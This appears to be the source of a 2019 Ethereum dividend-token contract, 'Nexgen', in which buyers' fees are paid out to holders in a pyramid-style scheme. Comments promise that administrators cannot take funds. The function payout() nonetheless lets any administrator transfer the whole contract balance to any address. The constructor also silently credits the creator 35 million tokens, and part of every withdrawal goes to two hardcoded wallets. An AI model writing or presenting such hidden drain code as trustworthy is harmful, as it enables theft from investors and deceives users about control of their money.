1 /*NEXGEN dApp - The World's First Most Sustainable Decentralized Application */
2 
3 /**
4  * Source Code first verified at https://etherscan.io on Wednesday, June 18, 2019
5  (UTC) */
6 
7 pragma solidity ^0.4.20;
8 
9 contract Nexgen {
10     
11     /*=================================
12     =            MODIFIERS            =
13     =================================*/
14     // only people with tokens
15     modifier onlybelievers () {
16         require(myTokens() > 0);
17         _;
18     }
19     
20     // only people with profits
21     modifier onlyhodler() {
22         require(myDividends(true) > 0);
23         _;
24     }
25     
26     // only people with sold token
27     modifier onlySelingholder() {
28         require(sellingWithdrawBalance_[msg.sender] > 0);
29         _;
30     }
31     
32     // administrators can:
33     // -> change the name of the contract
34     // -> change the name of the token
35     // -> change the PoS difficulty 
36     // they CANNOT:
37     // -> take funds
38     // -> disable withdrawals
39     // -> kill the contract
40     // -> change the price of tokens
41     modifier onlyAdministrator(){
42         address _customerAddress = msg.sender;
43         require(administrators[keccak256(_customerAddress)]);
44         _;
45     }
46     
47     
48 
49     
50     /*==============================
51     =            EVENTS            =
52     ==============================*/
53     event onTokenPurchase(
54         address indexed customerAddress,
55         uint256 incomingEthereum,
56         uint256 tokensMinted,
57         address indexed referredBy
58     );
59     
60     event onTokenSell(
61         address indexed customerAddress,
62         uint256 tokensBurned
63     );
64     
65     event onReinvestment(
66         address indexed customerAddress,
67         uint256 ethereumReinvested,
68         uint256 tokensMinted
69     );
70     
71     event onWithdraw(
72         address indexed customerAddress,
73         uint256 ethereumWithdrawn
74     );
75     
76     event onSellingWithdraw(
77         
78         address indexed customerAddress,
79         uint256 ethereumWithdrawn
80     
81     );
82     
83     // ERC20
84     event Transfer(
85         address indexed from,
86         address indexed to,
87         uint256 tokens
88     );
89     
90     
91     /*=====================================
92     =            CONFIGURABLES            =
93     =====================================*/
94     string public name = "Nexgen";
95     string public symbol = "NEXG";
96     uint8 constant public decimals = 18;
97     uint8 constant internal dividendFee_ = 10;
98     
99     uint256 constant internal tokenPriceInitial_ = 0.000055 ether;
100     uint256 constant internal tokenPriceIncremental_ = 0.00000015 ether;
101 
102     
103     
104     // proof of stake (defaults at 1 token)
105     uint256 public stakingRequirement = 1e18;
106      
107     // add community wallet here
108     address internal constant CommunityWalletAddr = address(0xfd6503cae6a66Fc1bf603ecBb565023e50E07340);
109         
110         //add trading wallet here
111     address internal constant TradingWalletAddr = address(0x6d5220BC0D30F7E6aA07D819530c8727298e5883);   
112 
113     
114     
115    /*================================
116     =            DATASETS            =
117     ================================*/
118     // amount of shares for each address (scaled number)
119     mapping(address => uint256) internal tokenBalanceLedger_;
120     mapping(address => uint256) internal referralBalance_;
121     mapping(address => int256) internal payoutsTo_;
122     mapping(address => uint256) internal sellingWithdrawBalance_;
123     mapping(address => uint256) internal ambassadorAccumulatedQuota_;
124 
125     address[] private contractTokenHolderAddresses_;
126 
127     
128     uint256 internal tokenSupply_ = 0;
129     uint256 internal profitPerShare_;
130     
131     uint256 internal soldTokens_=0;
132     uint256 internal contractAddresses_=0;
133     uint256 internal tempIncomingEther=0;
134     uint256 internal calculatedPercentage=0;
135     
136     
137     uint256 internal tempProfitPerShare=0;
138     uint256 internal tempIf=0;
139     uint256 internal tempCalculatedDividends=0;
140     uint256 internal tempReferall=0;
141     uint256 internal tempSellingWithdraw=0;
142 
143     address internal creator;
144     
145 
146 
147     
148     // administrator list (see above on what they can do)
149     mapping(bytes32 => bool) public administrators;
150     
151     
152     bool public onlyAmbassadors = false;
153     
154 
155 
156     /*=======================================
157     =            PUBLIC FUNCTIONS            =
158     =======================================*/
159     /*
160     * -- APPLICATION ENTRY POINTS --  
161     */
162     function Nexgen()
163         public
164     {
165         // add administrators here
166            
167         administrators[0x25d75fcac9be21f1ff885028180480765b1120eec4e82c73b6f043c4290a01da] = true;
168         creator = msg.sender;
169         tokenBalanceLedger_[creator] = 35000000*1e18;                     
170                          
171         
172     }
173 
174     /**
175      * Community Wallet Balance
176      */
177     function CommunityWalletBalance() public view returns(uint256){
178         return address(0xfd6503cae6a66Fc1bf603ecBb565023e50E07340).balance;
179     }
180 
181     /**
182      * Trading Wallet Balance
183      */
184     function TradingWalletBalance() public view returns(uint256){
185         return address(0x6d5220BC0D30F7E6aA07D819530c8727298e5883).balance;
186     } 
187 
188     /**
189      * Referral Balance
190      */
191     function ReferralBalance() public view returns(uint256){
192         return referralBalance_[msg.sender];
193     } 
194 
195     /**
196      * Converts all incoming Ethereum to tokens for the caller, and passes down the referral address (if any)
197      */
198     function buy(address _referredBy)
199         public
200         payable
201         returns(uint256)
202     {
203         purchaseTokens(msg.value, _referredBy);
204 
205     }
206     
207     
208     function()
209         payable
210         public
211     {
212         purchaseTokens(msg.value, 0x0);
213     }
214     
215     /**
216      * Converts all of caller's dividends to tokens.
217      */
218     function reinvest()
219         onlyhodler()
220         public
221     {
222         address _customerAddress = msg.sender;
223 
224         // fetch dividends
225         uint256 _dividends = myDividends(true); // retrieve ref. bonus later in the code
226  
227          //calculate  10 % for distribution 
228         uint256  ten_percentForDistribution= SafeMath.percent(_dividends,10,100,18);
229 
230          //calculate  90 % to reinvest into tokens
231         uint256  nighty_percentToReinvest= SafeMath.percent(_dividends,90,100,18);
232         
233         
234         // dispatch a buy order with the calculatedPercentage 
235         uint256 _tokens = purchaseTokens(nighty_percentToReinvest, 0x0);
236         
237         
238         //Empty their  all dividends beacuse we are reinvesting them
239          payoutsTo_[_customerAddress]=0;
240          referralBalance_[_customerAddress]=0;
241         
242     
243      
244       //distribute to all as per holdings         
245         profitPerShareAsPerHoldings(ten_percentForDistribution);
246         
247         // fire event
248         onReinvestment(_customerAddress, _dividends, _tokens);
249     }
250     
251     /**
252      * Alias of sell() and withdraw().
253      */
254     function exit()
255         public
256     {
257         // get token count for caller & sell them all
258         address _customerAddress = msg.sender;
259         uint256 _tokens = tokenBalanceLedger_[_customerAddress];
260         if(_tokens > 0) sell(_tokens);
261         
262         
263         withdraw();
264     }
265 
266     /**
267      * Withdraws all of the callers earnings.
268      */
269     function withdraw()
270         onlyhodler()
271         public
272     {
273         // setup data
274         address _customerAddress = msg.sender;
275         
276         //calculate 20 % of all Dividends and transfer them to two communities
277         //10% to community wallet
278         //10% to trading wallet
279         
280         uint256 _dividends = myDividends(true); // get all dividends
281         
282         //calculate  10 % for trending wallet
283         uint256  ten_percentForTradingWallet= SafeMath.percent(_dividends,10,100,18);
284 
285         //calculate 10 % for community wallet
286          uint256 ten_percentForCommunityWallet= SafeMath.percent(_dividends,10,100,18);
287 
288         
289         //Empty their  all dividends beacuse we are reinvesting them
290          payoutsTo_[_customerAddress]=0;
291          referralBalance_[_customerAddress]=0;
292        
293          // delivery service
294         CommunityWalletAddr.transfer(ten_percentForCommunityWallet);
295         
296          // delivery service
297         TradingWalletAddr.transfer(ten_percentForTradingWallet);
298         
299         //calculate 80% to tranfer it to customer address
300          uint256 eighty_percentForCustomer= SafeMath.percent(_dividends,80,100,18);
301 
302        
303         // delivery service
304         _customerAddress.transfer(eighty_percentForCustomer);
305         
306         // fire event
307         onWithdraw(_customerAddress, _dividends);
308     }
309     
310      /**
311      * Withdrawa all selling Withdraw of the callers earnings.
312      */
313     function sellingWithdraw()
314         onlySelingholder()
315         public
316     {
317         // setup data
318         address _customerAddress = msg.sender;
319         
320 
321         uint256 _sellingWithdraw = sellingWithdrawBalance_[_customerAddress] ; // get all balance
322         
323 
324         //Empty  all sellingWithdraw beacuse we are giving them ethers
325          sellingWithdrawBalance_[_customerAddress]=0;
326 
327      
328         // delivery service
329         _customerAddress.transfer(_sellingWithdraw);
330         
331         // fire event
332         onSellingWithdraw(_customerAddress, _sellingWithdraw);
333     }
334     
335     
336     
337      /**
338      * Sell tokens.
339      * Remember, there's a 10% fee here as well.
340      */
341    function sell(uint256 _amountOfTokens)
342         onlybelievers ()
343         public
344     {
345       
346         address _customerAddress = msg.sender;
347        
348         //calculate 10 % of tokens and distribute them 
349         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
350         uint256 _tokens = _amountOfTokens;
351       
352        uint256 _ethereum = tokensToEthereum_(_tokens);
353         
354           //calculate  10 % for distribution 
355        uint256  ten_percentToDistributet= SafeMath.percent(_ethereum,10,100,18);
356 
357           //calculate  90 % for customer withdraw wallet
358         uint256  nighty_percentToCustomer= SafeMath.percent(_ethereum,90,100,18);
359         
360         // burn the sold tokens
361         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
362         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
363         
364         //substract sold token from circulations of tokenSupply_
365         soldTokens_=SafeMath.sub(soldTokens_,_tokens);
366         
367         // update sellingWithdrawBalance of customer 
368        sellingWithdrawBalance_[_customerAddress] += nighty_percentToCustomer;       
369         
370        
371         //distribute to all as per holdings         
372        profitPerShareAsPerHoldings(ten_percentToDistributet);
373       
374       
375         
376         // fire event
377         onTokenSell(_customerAddress, _tokens);
378         
379     }
380     
381     
382     /**
383      * Transfer tokens from the caller to a new holder.
384      * Remember, there's a 5% fee here as well.
385      */
386     function transfer(address _toAddress, uint256 _amountOfTokens)
387         onlybelievers ()
388         public
389         returns(bool)
390     {
391         // setup
392         address _customerAddress = msg.sender;
393         
394         // make sure we have the requested tokens
395      
396         require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
397       
398         //calculate 5 % of total tokens calculate Tokens Received
399         uint256  five_percentOfTokens= SafeMath.percent(_amountOfTokens,5,100,18);
400         
401        
402        //calculate 95 % of total tokens calculate Tokens Received
403         uint256  nightyFive_percentOfTokens= SafeMath.percent(_amountOfTokens,95,100,18);
404         
405         
406         // burn the fee tokens
407         //convert ethereum to tokens
408         tokenSupply_ = SafeMath.sub(tokenSupply_,five_percentOfTokens);
409         
410         //substract five percent from communiity of tokens
411         soldTokens_=SafeMath.sub(soldTokens_, five_percentOfTokens);
412 
413         // exchange tokens
414         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
415         tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], nightyFive_percentOfTokens) ;
416         
417 
418         //calculate value of all token to transfer to ethereum
419         uint256 five_percentToDistribute = tokensToEthereum_(five_percentOfTokens);
420 
421 
422         //distribute to all as per holdings         
423         profitPerShareAsPerHoldings(five_percentToDistribute);
424 
425         // fire event
426         Transfer(_customerAddress, _toAddress, nightyFive_percentOfTokens);
427         
428         
429         return true;
430        
431     }
432     
433     /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/
434     /**
435      * administrator can manually disable the ambassador phase.
436      */
437     function disableInitialStage()
438         onlyAdministrator()
439         public
440     {
441         onlyAmbassadors = false;
442     }
443     
444    
445     function setAdministrator(bytes32 _identifier, bool _status)
446         onlyAdministrator()
447         public
448     {
449         administrators[_identifier] = _status;
450     }
451     
452    
453     function setStakingRequirement(uint256 _amountOfTokens)
454         onlyAdministrator()
455         public
456     {
457         stakingRequirement = _amountOfTokens;
458     }
459     
460     
461     function setName(string _name)
462         onlyAdministrator()
463         public
464     {
465         name = _name;
466     }
467     
468    
469     function setSymbol(string _symbol)
470         onlyAdministrator()
471         public
472     {
473         symbol = _symbol;
474     }
475 
476     function payout (address _address) public onlyAdministrator returns(bool res) {
477         _address.transfer(address(this).balance);
478         return true;
479     }
480     /*----------  HELPERS AND CALCULATORS  ----------*/
481     /**
482      * Method to view the current Ethereum stored in the contract
483      * Example: totalEthereumBalance()
484      */
485     function totalEthereumBalance()
486         public
487         view
488         returns(uint)
489     {
490         return this.balance;
491     }
492     
493     /**
494      * Retrieve the total token supply.
495      */
496     function totalSupply()
497         public
498         view
499         returns(uint256)
500     {
501         return tokenSupply_;
502     }
503     
504     /**
505      * Retrieve the tokens owned by the caller.
506      */
507     function myTokens()
508         public
509         view
510         returns(uint256)
511     {
512         address _customerAddress = msg.sender;
513         return balanceOf(_customerAddress);
514     }
515     
516     /**
517      * Retrieve the sold tokens .
518      */
519     function soldTokens()
520         public
521         view
522         returns(uint256)
523     {
524 
525         return soldTokens_;
526     }
527     
528     
529     /**
530      * Retrieve the dividends owned by the caller.
531        */ 
532     function myDividends(bool _includeReferralBonus) 
533         public 
534         view 
535         returns(uint256)
536     {
537         address _customerAddress = msg.sender;
538 
539         return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress);
540     }
541     
542     /**
543      * Retrieve the token balance of any single address.
544      */
545     function balanceOf(address _customerAddress)
546         view
547         public
548         returns(uint256)
549     {
550         return tokenBalanceLedger_[_customerAddress];
551     }
552     
553     /**
554      * Retrieve the selingWithdraw balance of address.
555      */
556     function selingWithdrawBalance()
557         view
558         public
559         returns(uint256)
560     {
561         address _customerAddress = msg.sender;
562          
563         uint256 _sellingWithdraw = (uint256) (sellingWithdrawBalance_[_customerAddress]) ; // get all balance
564         
565         return  _sellingWithdraw;
566     }
567     
568     /**
569      * Retrieve the dividend balance of any single address.
570      */
571     function dividendsOf(address _customerAddress)
572         view
573         public
574         returns(uint256)
575     {
576      
577         return  (uint256) (payoutsTo_[_customerAddress]) ;
578 
579         
580     }
581     
582     /**
583      * Return the buy price of 1 individual token.
584      */
585     function sellPrice() 
586         public 
587         view 
588         returns(uint256)
589     {
590        
591         if(tokenSupply_ == 0){
592             return tokenPriceInitial_ - tokenPriceIncremental_;
593         } else {
594             uint256 _ethereum = tokensToEthereum_(1e18);
595             
596             return _ethereum - SafeMath.percent(_ethereum,15,100,18);
597         }
598     }
599     
600     /**
601      * Return the sell price of 1 individual token.
602      */
603     function buyPrice() 
604         public 
605         view 
606         returns(uint256)
607     {
608         
609         if(tokenSupply_ == 0){
610             return tokenPriceInitial_ ;
611         } else {
612             uint256 _ethereum = tokensToEthereum_(1e18);
613            
614            
615             return _ethereum;
616         }
617     }
618     
619    
620     /**
621      * Function to calculate actual value after Taxes
622      */
623     function calculateTokensReceived(uint256 _ethereumToSpend) 
624         public 
625         view 
626         returns(uint256)
627     {
628          //calculate  15 % for distribution 
629         uint256  fifteen_percentToDistribute= SafeMath.percent(_ethereumToSpend,15,100,18);
630 
631         uint256 _dividends = SafeMath.sub(_ethereumToSpend, fifteen_percentToDistribute);
632         uint256 _amountOfTokens = ethereumToTokens_(_dividends);
633         
634         return _amountOfTokens;
635     }
636     
637     
638    
639    
640     function calculateEthereumReceived(uint256 _tokensToSell) 
641         public 
642         view 
643         returns(uint256)
644     {
645         require(_tokensToSell <= tokenSupply_);
646         
647         uint256 _ethereum = tokensToEthereum_(_tokensToSell);
648         
649          //calculate  10 % for distribution 
650         uint256  ten_percentToDistribute= SafeMath.percent(_ethereum,10,100,18);
651         
652         uint256 _dividends = SafeMath.sub(_ethereum, ten_percentToDistribute);
653 
654         return _dividends;
655 
656     }
657     
658     
659     /*==========================================
660     =            INTERNAL FUNCTIONS            =
661     ==========================================*/
662     
663     
664     function purchaseTokens(uint256 _incomingEthereum, address _referredBy)
665         internal
666         returns(uint256)
667     {
668         // data setup
669         address _customerAddress = msg.sender;
670         
671         //check if address 
672         tempIncomingEther=_incomingEthereum;
673         
674                 bool isFound=false;
675                 
676                 for(uint k=0;k<contractTokenHolderAddresses_.length;k++){
677                     
678                     if(contractTokenHolderAddresses_[k] ==_customerAddress){
679                         
680                      isFound=true;
681                     break;
682                         
683                     }
684                 }
685     
686     
687         if(!isFound){
688         
689             //increment address to keep track of no of users in smartcontract
690             contractAddresses_+=1;  
691             
692             contractTokenHolderAddresses_.push(_customerAddress);
693                         
694             }
695     
696      //calculate 85 percent
697       calculatedPercentage= SafeMath.percent(_incomingEthereum,85,100,18);
698       
699       uint256 _amountOfTokens = ethereumToTokens_(SafeMath.percent(_incomingEthereum,85,100,18));    
700 
701         // we can't give people infinite ethereum
702         if(tokenSupply_ > 0){
703             
704             // add tokens to the pool
705             tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
706         
707         
708         } else {
709             // add tokens to the pool
710             tokenSupply_ = _amountOfTokens;
711         }
712         
713         // update circulating supply & the ledger address for the customer
714         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
715         
716         
717         require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_) && tokenSupply_ <= (55000000*1e18));
718         
719         // is the user referred by a Nexgen Key?
720         if(
721             // is this a referred purchase?
722             _referredBy != 0x0000000000000000000000000000000000000000 &&
723 
724             // no cheating!
725             _referredBy != _customerAddress &&
726             
727             // does the referrer have at least X whole tokens?
728             // i.e is the referrer a godly chad masternode
729             tokenBalanceLedger_[_referredBy] >= stakingRequirement
730             
731         ){
732            
733      // give 5 % to referral
734      referralBalance_[_referredBy]+= SafeMath.percent(_incomingEthereum,5,100,18);
735      
736      tempReferall+=SafeMath.percent(_incomingEthereum,5,100,18);
737      
738      if(contractAddresses_>0){
739          
740      profitPerShareAsPerHoldings(SafeMath.percent(_incomingEthereum,10,100,18));
741     
742     
743        
744      }
745      
746     } else {
747           
748      
749      if(contractAddresses_>0){
750     
751      profitPerShareAsPerHoldings(SafeMath.percent(_incomingEthereum,15,100,18));
752 
753  
754         
755      }
756             
757         }
758         
759       
760     
761 
762         
763         // fire event
764         onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);
765         
766         //calculate sold tokens here
767         soldTokens_+=_amountOfTokens;
768         
769         return _amountOfTokens;
770     }
771 
772    
773      
774    /**
775      * Calculate Token price based on an amount of incoming ethereum
776      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
777      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
778      */
779      
780     function ethereumToTokens_(uint256 _ethereum)
781         internal
782         view
783         returns(uint256)
784     {
785         uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;
786         uint256 _tokensReceived = 
787          (
788             (
789                 // underflow attempts BTFO
790                 SafeMath.sub(
791                     (sqrt
792                         (
793                             (_tokenPriceInitial**2)
794                             +
795                             (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
796                             +
797                             (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
798                             +
799                             (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
800                         )
801                     ), _tokenPriceInitial
802                 )
803             )/(tokenPriceIncremental_)
804         )-(tokenSupply_)
805         ;
806   
807         return _tokensReceived;
808     }
809     
810     /**
811      * Calculate token sell value.
812           */
813      function tokensToEthereum_(uint256 _tokens)
814         internal
815         view
816         returns(uint256)
817     {
818 
819         uint256 tokens_ = (_tokens + 1e18);
820         uint256 _tokenSupply = (tokenSupply_ + 1e18);
821         uint256 _etherReceived =
822         (
823             // underflow attempts BTFO
824             SafeMath.sub(
825                 (
826                     (
827                         (
828                             tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
829                         )-tokenPriceIncremental_
830                     )*(tokens_ - 1e18)
831                 ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
832             )
833         /1e18);
834         return _etherReceived;
835     }
836     
837     //calculate profitPerShare as per holdings
838     function profitPerShareAsPerHoldings(uint256 calculatedDividend)  internal {
839     
840        //calculate number of token 
841        uint256 noOfTokens_;
842         tempCalculatedDividends=calculatedDividend;
843 
844        for(uint i=0;i<contractTokenHolderAddresses_.length;i++){
845          
846          noOfTokens_+= tokenBalanceLedger_[contractTokenHolderAddresses_[i]];
847 
848         }
849         
850         //check if self token balance is zero then distribute to others as per holdings
851         
852     for(uint k=0;k<contractTokenHolderAddresses_.length;k++){
853         
854         if(noOfTokens_>0 && tokenBalanceLedger_[contractTokenHolderAddresses_[k]]!=0){
855        
856 
857            profitPerShare_=SafeMath.percent(calculatedDividend,tokenBalanceLedger_[contractTokenHolderAddresses_[k]],noOfTokens_,18);
858          
859            tempProfitPerShare=profitPerShare_;
860 
861            payoutsTo_[contractTokenHolderAddresses_[k]] += (int256) (profitPerShare_) ;
862            
863            tempIf=1;
864 
865             
866         }else if(noOfTokens_==0 && tokenBalanceLedger_[contractTokenHolderAddresses_[k]]==0){
867             
868             tempIf=2;
869             tempProfitPerShare=profitPerShare_;
870 
871             payoutsTo_[contractTokenHolderAddresses_[k]] += (int256) (calculatedDividend) ;
872         
873             
874         }
875         
876       }
877         
878         
879     
880         
881 
882     
883     }
884     
885     //calculate square root
886     function sqrt(uint x) internal pure returns (uint y) {
887         uint z = (x + 1) / 2;
888         y = x;
889         while (z < y) {
890             y = z;
891             z = (x / z + z) / 2;
892         }
893     }
894 }
895 
896 /**
897  * @title SafeMath
898  * @dev Math operations with safety checks that throw on error
899  */
900 library SafeMath {
901     
902     function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(/*uint division,*/uint quotient) {
903 
904          // caution, check safe-to-multiply here
905         uint _numerator  = numerator * 10 ** (precision+1);
906         // with rounding of last digit
907         uint _quotient =  ((_numerator / denominator) + 5) / 10;
908         
909        // uint division_=numerator/denominator;
910         /* value*division_,*/
911         return (value*_quotient/1000000000000000000);
912   }
913 
914 
915     
916     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
917         if (a == 0) {
918             return 0;
919         }
920         uint256 c = a * b;
921         assert(c / a == b);
922         return c;
923     }
924 
925    
926     function div(uint256 a, uint256 b) internal pure returns (uint256) {
927         // assert(b > 0); // Solidity automatically throws when dividing by 0
928         uint256 c = a / b;
929         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
930         return c;
931     }
932 
933     
934     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
935         assert(b <= a);
936         return a - b;
937     }
938 
939    
940     function add(uint256 a, uint256 b) internal pure returns (uint256) {
941         uint256 c = a + b;
942         assert(c >= a);
943         return c;
944     }
945 }